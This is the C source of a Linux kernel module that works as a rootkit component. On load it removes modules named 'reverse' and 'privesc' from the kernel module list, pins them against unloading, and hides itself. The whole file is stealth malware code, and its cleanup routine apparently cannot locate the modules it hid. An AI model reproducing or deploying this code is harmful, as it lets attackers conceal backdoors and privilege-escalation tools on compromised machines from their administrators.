#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Hide and Protect Multiple Modules");
MODULE_VERSION("0.03");

struct module *get_module(const char *module_name);
void hide_module(const char *module_name);
void show_module(const char *module_name);
void protect_module(struct module *mod);
void unprotect_module(struct module *mod);
void hide_self(void);
void show_self(void);

static struct list_head *prev_self;
static short self_hidden = 0;

struct module *get_module(const char *module_name)
{
    struct module *mod;

    list_for_each_entry(mod, THIS_MODULE->list.prev, list) {
        if (strcmp(mod->name, module_name) == 0) {
            return mod;
        }
    }

    printk(KERN_ERR "hide_modules: Module %s not found.\n", module_name);
    return NULL;
}

void hide_module(const char *module_name)
{
    struct module *mod;

    mod = get_module(module_name);
    if (!mod) {
        return;
    }

    list_del(&mod->list);
    printk(KERN_INFO "hide_modules: Module %s hidden.\n", module_name);
}

void show_module(const char *module_name)
{
    struct module *mod;

    mod = get_module(module_name);
    if (!mod) {
        return;
    }

    list_add(&mod->list, THIS_MODULE->list.prev);
    printk(KERN_INFO "hide_modules: Module %s is now visible.\n", module_name);
}

void protect_module(struct module *mod)
{
    if (!mod) {
        return;
    }

    try_module_get(mod); 
    printk(KERN_INFO "hide_modules: Module %s protected.\n", mod->name);
}


void unprotect_module(struct module *mod)
{
    if (!mod) {
        return;
    }

    module_put(mod); 
    printk(KERN_INFO "hide_modules: Module %s unprotected.\n", mod->name);
}


void hide_self(void)
{
    if (!self_hidden) {
        prev_self = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        self_hidden = 1;
        printk(KERN_INFO "hide_modules: Self module hidden.\n");
    }
}


void show_self(void)
{
    if (self_hidden) {
        list_add(&THIS_MODULE->list, prev_self); 
        self_hidden = 0;
        printk(KERN_INFO "hide_modules: Self module visible.\n");
    }
}

static int __init hide_modules_init(void)
{
    struct module *reverse, *privesc;

    printk(KERN_INFO "hide_modules: Initialisation du module.\n");

    reverse = get_module("reverse");
    privesc = get_module("privesc");

    if (reverse) {
        hide_module("reverse");
        protect_module(reverse);
    }
    if (privesc) {
        hide_module("privesc");
        protect_module(privesc);
    }

    hide_self();

    return 0;
}

static void __exit hide_modules_exit(void)
{
    struct module *reverse, *privesc;

    printk(KERN_INFO "hide_modules: Nettoyage du module.\n");

    reverse = get_module("reverse");
    privesc = get_module("privesc");

    if (reverse) {
        show_module("reverse");
        unprotect_module(reverse);
    }
    if (privesc) {
        show_module("privesc");
        unprotect_module(privesc);
    }

    show_self();
}

module_init(hide_modules_init);
module_exit(hide_modules_exit);
